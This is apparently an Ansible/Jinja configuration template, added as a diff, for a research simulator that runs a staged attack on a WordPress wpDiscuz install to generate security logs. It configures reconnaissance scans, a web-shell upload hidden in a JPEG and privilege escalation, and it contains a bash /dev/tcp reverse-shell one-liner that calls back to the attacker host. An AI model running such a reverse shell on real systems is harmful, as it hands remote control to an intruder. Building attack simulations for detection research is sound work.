@@ -1,0 +1,132 @@
+# sm config templates
+
+kyoushi_executable_template: kyoushi.sh.j2
+
+kyoushi_config_files:
+  config:
+    src: config.yml.j2
+    dst: "{{ kyoushi_sim_config_path }}/config.yml"
+    deploy: yes
+  sm:
+    src: attacker.yml.j2
+    dst: "{{ kyoushi_sim_config_path }}/sm.yml"
+    deploy: yes
+
+# kyoushi simulation files config
+
+kyoushi_files_owner: "{{ attacker.username }}"
+kyoushi_files_group: "{{ attacker.username }}"
+
+kyoushi_files_dir: "/home/{{ kyoushi_files_owner }}/files"
+kyoushi_files:
+  - src: "{{ kyoushi_attacker_web_shell_image_src }}"
+    dest: "{{ kyoushi_attacker_web_shell_image }}"
+
+# cr cli config
+
+# use a consistent random value for seed
+kyoushi_seed: "{{ 4294967295 | random(seed=inventory_hostname) }}"
+
+kyoushi_sm_name: ait.aecid.attacker.wpdiscuz
+kyoushi_simulation_version: 0.3.7
+kyoushi_statemachines_version: 0.3.2
+#kyoushi_packages_reinstall: yes
+
+kyoushi_venv_python_version: 3.8
+kyoushi_user_name: "{{ attacker.username }}"
+kyoushi_user_group: "{{ attacker.username }}"
+
+# sm logging config
+
+kyoushi_log_dir: "/var/log/kyoushi/{{ kyoushi_sm_effective_name }}"
+
+kyoushi_log_level: INFO
+# kyoushi_log_timestamp:
+#   format: 'e.g. %m/%d/%Y, %H:%M:%S'
+#   utc: 'True'
+#   key: 'timestamp'
+kyoushi_log_console:
+  enabled: yes
+  format: plain
+kyoushi_log_file:
+  enabled: yes
+  format: json
+  path: "{{ kyoushi_log_dir }}/sm.log"
+
+
+# The idle configuration for the state machine
+kyoushi_sm_idle_big_min: \var{context.kyoushi_sm_idle_big_min}
+kyoushi_sm_idle_big_max: \var{context.kyoushi_sm_idle_big_max}
+kyoushi_sm_idle_medium_min: \var{context.kyoushi_sm_idle_medium_min}
+kyoushi_sm_idle_medium_max: \var{context.kyoushi_sm_idle_medium_max}
+kyoushi_sm_idle_small_min: \var{context.kyoushi_sm_idle_small_min}
+kyoushi_sm_idle_small_max: \var{context.kyoushi_sm_idle_small_max}
+kyoushi_sm_idle_tiny_min: \var{context.kyoushi_sm_idle_tiny_min}
+kyoushi_sm_idle_tiny_max: \var{context.kyoushi_sm_idle_tiny_max}
+
+# The attack start time 
+# (can also be defined as timedelta relative to the current time)
+kyoushi_attacker_start: \var{context.kyoushi_attacker_start}
+# The host user escalation start time 
+# (can also be defined as timedelta relative to the attack start time)
+kyoushi_attacker_escalate_start: \var{context.kyoushi_attacker_escalate_start}
+
+# The VPN connection config to use
+kyoushi_attacker_vpn: "/home/{{ attacker.username }}/.openvpn/stolen.ovpn"
+
+# Recon phase config
+# The host to traceroute to
+kyoushi_attacker_recon_trace: "{{ openstack.addresses.internet[0].addr }}" # trace to the attacker host itself
+# The DMZ network to scan
+kyoushi_attacker_recon_dmz: "{{ firewall_cidrs.dmz }}"
+# The intranet network to scan
+kyoushi_attacker_recon_intranet: "{{ firewall_cidrs.lan }}"
+# The DNS server to target during the domain scan
+kyoushi_attacker_recon_dns: "{{ hostvars['inet-firewall'].openstack.addresses.dmz[0].addr }}"
+# The domain to brute force
+kyoushi_attacker_recon_domain: "{{ domains.company_external.domain }}"
+# The hosts to target for the service scan
+kyoushi_attacker_recon_hosts:
+\{% for ip in context.kyoushi_attacker_recon_hosts }
+  - \var{ip}
+\{% endfor }
+
+# The base URL for the wordpress instance
+kyoushi_attacker_wp_url: "https://{{ hostvars['intranet_server'].wp_apache_hostname }}"
+# The path to admin ajax endpoint (without leading slash).
+#kyoushi_attacker_wp_admin_ajax: wp-admin/admin-ajax.php
+
+# The wordlists to use. 
+# By default `/usr/share/dirb/wordlists/common.txt` is used.
+kyoushi_attacker_wp_dirb: []
+
+# The JPEG image to use to for the web shell upload exploit
+kyoushi_attacker_web_shell_image: "{{ kyoushi_files_dir }}/\var{context.kyoushi_attacker_web_shell_name}.jpg"
+kyoushi_attacker_web_shell_image_src: shell.jpg
+  
+# The commands to execute via the web shell
+kyoushi_attacker_web_shell_commands:
+\var{(context.kyoushi_attacker_web_shell_commands)}
+
+# the connection details for the reverse shell listener
+# the host address to bind and connect to
+kyoushi_attacker_reverse_shell_host: "{{ openstack.addresses.internet[0].addr }}"
+# The port to bind the reverse shell to
+kyoushi_attacker_reverse_shell_port: \var{context.kyoushi_attacker_reverse_shell_port}
+
+# The command to execute via the web shell to establish a reverse shell
+kyoushi_attacker_reverse_shell:
+  - "bash"
+  - "-c"
+  # !!! Note that the leading white space must not be removed since Jinja2/Ansible will remove the surrounding single quotes if it is missing
+  - " '0<&196;exec 196<>/dev/tcp/{{ kyoushi_attacker_reverse_shell_host }}/{{ kyoushi_attacker_reverse_shell_port }}; sh <&196 >&196 2>&196'" 
+  - "&"
+
+# The user to escalate to in the 2nd part
+kyoushi_attacker_reverse_shell_user: "{{ attack_shell_user.username }}"
+# The password to use for escalation
+kyoushi_attacker_reverse_shell_password: "{{ attack_shell_user.password }}"
+  
+# The commands to execute via the reverse shell
+kyoushi_attacker_reverse_shell_commands:
+\var{context.kyoushi_attacker_reverse_shell_commands}
